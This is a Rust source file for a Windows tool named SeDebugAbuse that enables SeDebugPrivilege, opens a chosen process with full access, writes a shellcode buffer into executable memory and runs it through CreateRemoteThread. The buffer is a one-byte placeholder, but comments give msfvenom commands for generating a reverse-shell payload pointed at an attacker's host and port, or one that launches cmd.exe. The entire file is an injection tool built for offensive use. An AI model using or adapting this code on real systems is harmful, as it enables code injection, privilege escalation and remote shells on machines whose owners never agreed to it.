use std::env;
use std::ptr::null_mut;
use windows::Win32::Foundation::{CloseHandle, HANDLE, LUID};
use windows::Win32::Security::{
    AdjustTokenPrivileges, LookupPrivilegeValueW, LUID_AND_ATTRIBUTES, SE_DEBUG_NAME,
    TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
};
use windows::Win32::Security::{SE_PRIVILEGE_ENABLED, TOKEN_QUERY};
use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows::Win32::System::Memory::{
    VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateRemoteThread, GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_ALL_ACCESS,
};

fn main() {
    unsafe {
        let args: Vec<String> = env::args().collect();
        if args.len() != 2 {
            println!(".\\SeDebugAbuse-rs.exe <pid>");
            std::process::exit(0);
        }

        let pid = args[1].parse::<u32>().unwrap_or_else(|_e| {
            println!("Formato PID Error");
            std::process::exit(0)
        });
        // msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f rust -v buf
        // msfvenom -p windows/x64/exec CMD='cmd.exe' EXITFUNC=none -f rust
        let buf: [u8; 1] = [0x41];

        let mut htoken: HANDLE = HANDLE::default();
        let mut token_privileges = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES {
                Luid: LUID::default(),
                Attributes: SE_PRIVILEGE_ENABLED,
            }; 1],
        };
        if let Err(_) = OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
            &mut htoken,
        ) {
            println!("[-] Error when performing OpenProcessToken");
            std::process::exit(0)
        };

        if let Err(_) = LookupPrivilegeValueW(
            None,
            SE_DEBUG_NAME,
            &mut token_privileges.Privileges[0].Luid as *mut LUID,
        ) {
            println!("[-] Error when performing LookupPrivilegeValueW");
            std::process::exit(0)
        };

        if let Err(_) = AdjustTokenPrivileges(htoken, false, Some(&token_privileges), 0, None, None)
        {
            println!("[-] Error when performing AdjustTokenPrivileges");
            std::process::exit(0)
        }

        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(proc) => {
                let r_buf = VirtualAllocEx(
                    proc,
                    Some(null_mut()),
                    std::mem::size_of::<i32>(),
                    MEM_RESERVE | MEM_COMMIT,
                    PAGE_EXECUTE_READWRITE,
                );

                if let Err(_) = WriteProcessMemory(proc, r_buf, buf.as_ptr() as _, buf.len(), None)
                {
                    println!("[-] Error when performing WriteProcessMemory");
                    std::process::exit(0)
                }

                println!("[+] CreateRemoteThread Executed!");
                let _r_thread = CreateRemoteThread(
                    proc,
                    None,
                    0,
                    Some(std::mem::transmute(r_buf)),
                    None,
                    0,
                    None,
                );
                let _ = CloseHandle(proc);
            }
            Err(erro) => {
                println!("[-] Error when performing OpenProcess");
                println!("{:?}", erro)
            }
        }
    };
}
